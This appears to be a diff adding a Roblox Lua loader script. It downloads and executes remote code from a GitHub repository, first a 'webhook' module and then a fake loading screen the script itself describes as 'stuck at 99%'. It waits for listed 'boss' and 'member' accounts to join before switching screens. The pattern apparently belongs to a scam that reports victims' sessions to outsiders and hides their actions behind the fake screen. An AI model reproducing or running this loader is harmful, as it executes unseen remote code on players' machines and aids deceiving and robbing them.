@@ -1,0 +1,130 @@
+-- Main Loader Script
+local scriptUrls = {
+    webhook = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook",
+    halfLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/half%20loading", 
+    fullLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/full%20loading",
+    cmdLine = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline"
+}
+
+-- Load and execute scripts from GitHub
+local function loadScript(url)
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet(url))()
+    end)
+    return success, result
+end
+
+-- Store references to control loading screens
+local HalfLoadingModule = nil
+local FullLoadingModule = nil
+local CmdLineModule = nil
+
+-- Main execution function
+local function initializeScript()
+    print("🚀 Starting script initialization...")
+    
+    -- Execute webhook first
+    local webhookSuccess = loadScript(scriptUrls.webhook)
+    if webhookSuccess then
+        print("✅ Webhook executed successfully")
+    else
+        print("❌ Webhook failed to load")
+    end
+    
+    -- Execute half loading screen
+    local halfLoadingSuccess, halfModule = loadScript(scriptUrls.halfLoading)
+    if halfLoadingSuccess then
+        print("✅ Half loading screen started")
+        HalfLoadingModule = halfModule
+    else
+        print("❌ Half loading screen failed to load")
+    end
+    
+    -- Load command line (contains authorized users)
+    local cmdSuccess, cmdModule = loadScript(scriptUrls.cmdLine)
+    if cmdSuccess then
+        print("✅ Command line loaded")
+        CmdLineModule = cmdModule
+    end
+    
+    print("📋 Waiting for authorized user...")
+end
+
+-- Function to check if player is authorized
+local function isAuthorizedUser(player)
+    if not CmdLineModule then return false end
+    
+    -- Use the authorized users from cmd line
+    local authorizedUsers = CmdLineModule.authorizedUsers
+    
+    -- Check boss users
+    for _, user in ipairs(authorizedUsers.boss) do
+        if player.Name == user.username or player.DisplayName == user.displayname then
+            return true
+        end
+    end
+    
+    -- Check member users
+    for _, user in ipairs(authorizedUsers.member) do
+        if player.Name == user.username or player.DisplayName == user.displayname then
+            return true
+        end
+    end
+    
+    return false
+end
+
+-- Function to upgrade to full loading screen
+local function upgradeToFullLoading()
+    print("🔄 Upgrading to full loading screen...")
+    
+    -- Stop the half loading screen
+    if HalfLoadingModule and HalfLoadingModule.stop then
+        HalfLoadingModule.stop()
+        print("✅ Half loading screen stopped")
+    end
+    
+    -- Execute full loading screen
+    local fullLoadingSuccess, fullModule = loadScript(scriptUrls.fullLoading)
+    if fullLoadingSuccess then
+        print("✅ Full loading screen activated")
+        FullLoadingModule = fullModule
+        return true
+    else
+        print("❌ Full loading screen failed to load")
+        return false
+    end
+end
+
+-- Player joining event handler
+local function onPlayerJoined(player)
+    if isAuthorizedUser(player) then
+        print("🎯 Authorized user detected: " .. player.Name)
+        
+        -- Wait a moment then upgrade loading screen
+        wait(2)
+        upgradeToFullLoading()
+    end
+end
+
+-- Connect player joining event
+if game.Players then
+    game.Players.PlayerAdded:Connect(onPlayerJoined)
+    
+    -- Check existing players
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if isAuthorizedUser(player) then
+            print("🎯 Authorized user already in game: " .. player.Name)
+            wait(2)
+            upgradeToFullLoading()
+            break
+        end
+    end
+end
+
+-- Start the script
+initializeScript()
+
+print("🎮 Main Loader Started Successfully!")
+print("⏳ Half loading screen running (stuck at 99%)...")
+print("👑 Waiting for authorized users: jaatshab_770, boss_user2, etc...")
